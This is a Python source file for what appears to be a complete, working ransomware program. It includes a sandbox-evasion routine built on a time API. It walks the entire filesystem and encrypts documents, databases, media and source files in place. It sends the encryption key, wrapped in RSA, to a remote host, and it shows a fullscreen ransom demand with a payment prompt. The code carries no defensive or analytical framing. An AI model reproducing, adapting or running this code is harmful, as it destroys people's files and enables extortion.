import requests
import time
import os
import tkinter as tk
import random

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from tkinter import *

from config import HOST

AES_key = get_random_bytes(32)

filetype_set = {
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".pdf",
    ".txt",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".bmp",
    ".tif",
    ".tiff",
    ".mp4",
    ".mkv",
    ".avi",
    ".mp3",
    ".wav",
    ".zip",
    ".rar",
    ".7z",
    ".sql",
    ".mdb",
    ".db",
    ".bak",
    ".php",
    ".html",
    ".asp",
    ".aspx",
    ".js",
    ".java",
    ".py",
    ".c",
    ".cpp",
    ".cs",
    ".odt",
    ".ods",
    ".ini",
    ".cfg",
    ".log",
    ".iso",
}


def main():
    fake_calculation()
    seek_and_encrypt()
    encrypt_and_send_ransom_key()
    run_ui()


def fake_calculation():
    try:
        resp = requests.get("http://worldtimeapi.org/api/timezone/Europe/London")
        start_time = resp.json()['unixtime']
        start_timer = time.time()

        def calc(start_timer):
            f = lambda x: x**4 + 5*x + 1 - x**3
            a = 0
            while time.time() - start_timer < 15:
                a = f(a)

                if a > 1e300:
                    a = random.randint(0,100)

        calc(start_timer)
        while True:
            resp = requests.get("http://worldtimeapi.org/api/timezone/Europe/London")
            end_time = resp.json()['unixtime']

            if end_time - start_time > 14:
                return
            
            start_timer = time.time()
            calc(start_timer)
    except Exception as e:
        time.sleep(1e6)
        exit(0)
        # We were sandboxed and time.time() was manipulated due to time api timeout


def seek_and_encrypt():
    root_directory = os.path.abspath(os.sep)

    # Write a test file to check the recieved decryption key
    with open(os.path.join(root_directory, "check.txt"), "w") as file:
        file.write("check_key")

    for dir_path, dir_names, file_names in os.walk(root_directory):
        # for dir_path, dir_names, file_names in os.walk(os.getcwd()):
        for filename in file_names:
            file_extension = os.path.splitext(filename)[1]
            if file_extension in filetype_set:
                try:
                    encrypt_file(os.path.join(dir_path, filename))
                except Exception as e:
                    continue
        # print(files.path.splitext()[1])


def seek_and_decrypt():
    root_directory = os.path.abspath(os.sep)
    for dir_path, dir_names, file_names in os.walk(root_directory):
        # for dir_path, dir_names, file_names in os.walk(os.getcwd()):
        for filename in file_names:
            file_extension = os.path.splitext(filename)[1]
            if file_extension in filetype_set:
                try:
                    decrypt_file(os.path.join(dir_path, filename))
                except Exception as e:
                    continue


def check_decrypt_key(key):
    global AES_key

    key = bytes.fromhex(key)

    f = open(os.path.join(os.path.abspath(os.sep), "check.txt"), "r+b")
    nonce = f.read(8)
    encrypted_data = f.read()
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    decrypted_data = cipher.decrypt(encrypted_data)

    if "check_key" in decrypted_data.decode():
        AES_key = key
        return True
    else:
        return False


def encrypt_file(file_path):
    f = open(file_path, "r+b")
    file_data = f.read()
    nonce = get_random_bytes(8)
    cipher = AES.new(AES_key, AES.MODE_CTR, nonce=nonce)
    encrypted_data = cipher.encrypt(file_data)

    f.seek(0)
    f.write(nonce)
    f.write(encrypted_data)
    f.truncate()
    f.close()

    print(f"Encrypted file : {file_path}!")


def decrypt_file(file_path):
    f = open(file_path, "r+b")
    nonce = f.read(8)
    encrypted_data = f.read()
    cipher = AES.new(AES_key, AES.MODE_CTR, nonce=nonce)
    decrypted_data = cipher.decrypt(encrypted_data)

    f.seek(0)
    f.write(decrypted_data)
    f.truncate()
    f.close()


def recieve_pub_key():
    request = requests.get(HOST + "/key")
    return request.json()["key"]


def encrypt_and_send_ransom_key():
    pub_key = RSA.importKey(recieve_pub_key())
    cipher_rsa = PKCS1_OAEP.new(pub_key)
    encrypted_ransomkey = cipher_rsa.encrypt(AES_key)

    headers = {
        "accept": "application/json",
        "Content-Type": "application/json",
    }
    data = {"key": encrypted_ransomkey.hex()}

    requests.post(
        HOST + "/bad_day_key",
        headers=headers,
        json=data,
    )


def klick():
    print("button klicked")


def run_ui():
    root = tk.Tk()
    root.title("You Have Been Ransomwared")
    root.attributes("-fullscreen", True)
    root.configure(bg="black")

    frame = tk.Frame(root, bg="black")
    frame.place(relx=0.5, rely=0.5, anchor="center")

    label = tk.Label(
        frame,
        text="All your files have been encrypted.\nPay one billion dollars to unlock your files",
        font=("Arial", 24),
        fg="red",
        bg="black",
    )
    label.pack(pady=20)

    key_entry = tk.Entry(frame, font=("Arial", 18), width=30)
    key_entry.pack(pady=10)

    def check_key():
        entered_key = key_entry.get()
        if check_decrypt_key(entered_key):
            seek_and_decrypt()
            tk.messagebox.showinfo("Success", "Correct key! Your files are decrypted.")
            root.destroy()
        else:
            tk.messagebox.showerror("Error", "Incorrect key! Your files remain encrypted.")

    check_button = tk.Button(
        frame,
        text="Enter Key to Decrypt",
        command=check_key,
        font=("Arial", 18),
        bg="green",
        fg="white",
    )
    check_button.pack(pady=10)

    def pay_ransom():
        tk.messagebox.showinfo("Payment", "swish 1 billion dollars to 0713371337")

    pay_button = tk.Button(
        frame,
        text="Pay Ransom",
        command=pay_ransom,
        font=("Arial", 40),
        bg="red",
        fg="white",
    )
    pay_button.pack(pady=10)

    def exit_ransomware():
        tk.messagebox.showinfo(
            "Payment",
            "exiting this window will \nmake it impossible to retrieve your files",
        )

    exit_button = tk.Button(
        frame,
        text="Exit",
        command=exit_ransomware,
        font=("Arial", 18),
        bg="gray",
        fg="white",
    )
    exit_button.pack(pady=10)

    root.mainloop()


if __name__ == "__main__":
    main()
    pass
